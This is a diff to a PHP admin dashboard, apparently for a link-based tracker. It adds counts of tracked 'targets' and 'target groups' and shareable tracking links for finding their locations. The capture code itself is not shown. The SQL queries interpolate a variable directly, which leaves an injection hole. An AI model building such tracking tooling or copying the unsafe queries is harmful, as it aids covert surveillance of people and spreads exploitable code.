@@ -129,6 +129,27 @@ $sql_locations = "select count(all_info) from devices where admin = '$admin'";
 $result_locations = $conn->query($sql_locations);
 
 
+$sql_targets = "select count(distinct target_id) from targets where admin = '$admin'";
+$result_targets = $conn->query($sql_targets);
+
+
+$sql_targets_locations = "select count(all_info) from targets where admin = '$admin'";
+$result_targets_locations = $conn->query($sql_targets_locations);
+
+
+
+$sql_targets_group = "select count(distinct target_id) from targets_group 
+                      where admin = '$admin' and last_ip != '0.0.0.0' ";
+$result_targets_group = $conn->query($sql_targets_group);
+
+
+$sql_targets_group_locations = "select count(all_info) from targets_group 
+                                where admin = '$admin' and last_ip != '0.0.0.0' ";
+$result_targets_group_locations = $conn->query($sql_targets_group_locations);
+
+
+
+
 $protocol = $_SERVER['SERVER_PORT'];
 
 if ($protocol == '443')
@@ -150,6 +171,15 @@ $url = $_SERVER['SERVER_NAME'];
 
 $link_url = $protocol .$url ."/view.php?=$admin"; 
 $link_url = str_replace(" ","",$link_url);
+
+
+$link_url2 = $protocol .$url ."/targets.php"; 
+$link_url2 = str_replace(" ","",$link_url2);
+
+
+$link_url3 = $protocol .$url ."/targets_group.php"; 
+$link_url3 = str_replace(" ","",$link_url3);
+
 
 #$link_wan = $protocol  .$ip_wan  ."/view.php?=$admin";
 #$link_wan = str_replace(" ","",$link_wan);
@@ -174,6 +204,37 @@ $link_url = str_replace(" ","",$link_url);
            {
            $locations = $row_locations[0];
             }
+
+
+
+    while ($row_targets = $result_targets->fetch_array(MYSQLI_NUM))
+           {
+            $targets = $row_targets[0];
+            }
+
+
+    while ($row_targets_locations = $result_targets_locations->fetch_array(MYSQLI_NUM))
+           {
+           $targets_locations = $row_targets_locations[0];
+            }
+
+
+
+
+ while ($row_targets_group = $result_targets_group->fetch_array(MYSQLI_NUM))
+           {
+            $targets_group = $row_targets_group[0];
+            }
+
+
+    while ($row_targets_group_locations = $result_targets_group_locations->fetch_array(MYSQLI_NUM))
+           {
+           $targets_group_locations = $row_targets_group_locations[0];
+            }
+  
+
+    $all_locations = $locations + $targets_locations + $targets_group_locations;
+    $all_devices   = $devices + $targets + $targets_group;
 
 
 echo'
@@ -399,7 +460,7 @@ echo'
                                     <div class="col-xs-7">
                                         <div class="numbers">
                                             <p> Locations </p>
-                                             '.$locations.'
+                                             '.$all_locations.'
                                         </div>
                                     </div>
                                 </div>
@@ -425,7 +486,7 @@ echo'
                                     <div class="col-xs-7">
                                         <div class="numbers">
                                             <p> Devices </p>
-                                             '.$devices.'
+                                             '.$all_devices.'
                                         </div>
                                     </div>
                                 </div>
@@ -449,14 +510,28 @@ echo'
                    <div class="card">
                      <div class="header">
                        <h4 class="title" align="center"> 
-                         <i class="fa fa-link"></i> Links for find the location 
+                         <i class="fa fa-link"></i> Links for find the locations 
                        </h4>
                          <br>
 
                   <p align="center">
                      <i class="fa fa-external-link"></i>
-                     Link on url: &nbsp;
+                     Default Link : &nbsp;
                      <a href="" id="a" onclick="copy(this)"> '.$link_url.' </a>
+                  </p>
+
+
+                 <p align="center">
+                     <i class="fa fa-external-link"></i>
+                      Targets : &nbsp;
+                     <a href="'.$link_url2.'" id="a"> '.$link_url2.' </a>
+                  </p>
+
+
+                <p align="center">
+                     <i class="fa fa-external-link"></i>
+                      Targets Group: &nbsp;
+                     <a href="'.$link_url3.'" id="a"> '.$link_url3.' </a>
                   </p>
 
                  <p>&nbsp;</p>
